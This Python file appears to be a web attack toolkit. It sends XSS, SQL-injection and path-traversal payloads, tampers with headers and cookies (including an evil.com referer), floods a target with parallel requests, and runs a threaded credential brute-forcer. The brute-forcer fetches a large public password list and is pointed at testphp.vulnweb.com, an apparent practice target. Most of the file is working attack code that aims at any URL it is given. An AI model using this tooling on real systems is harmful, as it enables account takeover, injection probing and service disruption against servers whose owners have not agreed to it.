# attack_vector.py
from datetime import datetime
from helpers import log_json
import concurrent.futures

def method_variation(session, url, headers, proxy=None):
    """Try uncommon HTTP methods to test server behavior."""
    methods = ["PUT", "DELETE", "OPTIONS", "HEAD"]
    for m in methods:
        try:
            r = session.request(m, url, headers=headers, timeout=10, verify=False)
            print(f"[{m}] {url} -> {r.status_code}")
            log_json({
                "time": datetime.utcnow().isoformat(),
                "phase": "attack_vector",
                "proxy": proxy,
                "url": url,
                "method": m,
                "status": r.status_code,
                "body_preview": r.text[:200]
            })
        except Exception as e:
            print(f"Error in {m} request: {e}")
            log_json({
                "time": datetime.utcnow().isoformat(),
                "phase": "attack_vector",
                "proxy": proxy,
                "url": url,
                "method": m,
                "error": str(e)
            })


def payload_injection(session, url, headers, proxy=None):
    """Inject test payloads in query params to simulate fuzzing."""
    payloads = ["<script>alert(1)</script>", "' OR '1'='1", "../../etc/passwd", "test123"]
    for p in payloads:
        try:
            target = f"{url}?q={p}"
            r = session.get(target, headers=headers, timeout=10, verify=False)
            print(f"[INJECT] {target} -> {r.status_code}")
            log_json({
                "time": datetime.utcnow().isoformat(),
                "phase": "attack_vector",
                "proxy": proxy,
                "url": target,
                "payload": p,
                "status": r.status_code,
                "body_preview": r.text[:200]
            })
        except Exception as e:
            print(f"Injection error {p}: {e}")
            log_json({
                "time": datetime.utcnow().isoformat(),
                "phase": "attack_vector",
                "proxy": proxy,
                "url": url,
                "payload": p,
                "error": str(e)
            })


def header_injection(session, url, headers, proxy=None):
    """Inject custom headers to test server behavior."""
    test_headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"User-Agent": "sqlmap/1.0"},
        {"Referer": "http://evil.com"},
        {"Content-Type": "application/json"}
    ]
    for h in test_headers:
        try:
            r = session.get(url, headers={**headers, **h}, timeout=10, verify=False)
            print(f"[HEADER] {url} with {h} -> {r.status_code}")
            log_json({
                "time": datetime.utcnow().isoformat(),
                "phase": "attack_vector",
                "proxy": proxy,
                "url": url,
                "headers": h,
                "status": r.status_code,
                "body_preview": r.text[:200]
            })
        except Exception as e:
            print(f"Header injection error {h}: {e}")


def cookie_tampering(session, url, headers, proxy=None):
    """Send fake/expired cookies to test session validation."""
    cookies_list = [
        {"session": "fake123"},
        {"auth": "expired_token"},
        {"cart_id": "999999"}
    ]
    for c in cookies_list:
        try:
            r = session.get(url, headers=headers, cookies=c, timeout=10, verify=False)
            print(f"[COOKIE] {url} with {c} -> {r.status_code}")
            log_json({
                "time": datetime.utcnow().isoformat(),
                "phase": "attack_vector",
                "proxy": proxy,
                "url": url,
                "cookies": c,
                "status": r.status_code,
                "body_preview": r.text[:200]
            })
        except Exception as e:
            print(f"Cookie tampering error {c}: {e}")


def flood_attack(session, url, headers, proxy=None):
    """Send multiple parallel requests to test rate limiting."""
    def send_req(i):
        try:
            r = session.get(url, headers=headers, timeout=5, verify=False)
            return f"[FLOOD-{i}] {url} -> {r.status_code}"
        except Exception as e:
            return f"Flood error {i}: {e}"

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        results = executor.map(send_req, range(50))
        for res in results:
            print(res)


import concurrent.futures
import time
from datetime import datetime
from helpers import log_json
import requests
from bs4 import BeautifulSoup   # 👈 HTML parsing

def load_wordlist(path_or_url):
    """Load usernames/passwords from local file or remote URL."""
    try:
        if path_or_url.startswith("http://") or path_or_url.startswith("https://"):
            r = requests.get(path_or_url, timeout=15)
            r.raise_for_status()
            return [line.strip() for line in r.text.splitlines() if line.strip()]
        else:
            with open(path_or_url, "r", encoding="utf-8") as f:
                return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Wordlist load error: {e}")
        return []

def detect_login_fields(session, url, headers):
    """Parse login form and detect input field names."""
    try:
        r = session.get(url, headers=headers, timeout=10, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        inputs = [i.get("name") for i in soup.find_all("input") if i.get("name")]
        # Common heuristic: first two fields are username/email and password
        if len(inputs) >= 2:
            return inputs[0], inputs[1]
        else:
            return "uname", "pass"  # fallback
    except Exception as e:
        print(f"Field detection error: {e}")
        return "uname", "pass"

def bruteforce_attack(session, url, headers, proxy=None,
                      userlist_path=None, passlist_path=None,
                      max_workers=10, delay=0.2):
    """Enhanced bruteforce attack with auto-detected login fields."""
    usernames = load_wordlist(userlist_path) if userlist_path else ["admin", "test", "user"]
    passwords = load_wordlist(passlist_path) if passlist_path else ["test","123456", "password", "admin", "letmein"]

    # 👇 Detect login field names dynamically
    user_field, pass_field = detect_login_fields(session, url, headers)
    print(f"[INFO] Using fields: {user_field}, {pass_field}")

    def try_login(u, p):
        try:
            r = session.post(url, headers=headers,
                             data={user_field: u, pass_field: p},
                             timeout=10, verify=False)
            result = {
                "time": datetime.utcnow().isoformat(),
                "phase": "attack_vector",
                "proxy": proxy,
                "url": url,
                "username": u,
                "password": p,
                "status": r.status_code,
                "body_preview": r.text[:200]
            }
            log_json(result)

            if r.status_code == 200 and "Invalid" not in r.text:
                return f"[SUCCESS] Possible valid creds: {u}:{p}"
            else:
                return f"[FAIL] {u}:{p} -> {r.status_code}"
        except Exception as e:
            return f"Bruteforce error {u}:{p} -> {e}"

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for u in usernames:
            for p in passwords:
                futures.append(executor.submit(try_login, u, p))
                time.sleep(delay)  # small delay for rate limiting

        for f in concurrent.futures.as_completed(futures):
            print(f.result())

# ✅ Main call
if __name__ == "__main__":
    session = requests.Session()
    bruteforce_attack(
        session,
        "http://testphp.vulnweb.com/login.php",
        headers={"User-Agent": "attacker-tests"},
        userlist_path="usernames.txt",
        passlist_path="https://raw.githubusercontent.com/duyet/bruteforce-database/refs/heads/master/1000000-password-seclists.txt",
        max_workers=10,
        delay=0.1
    )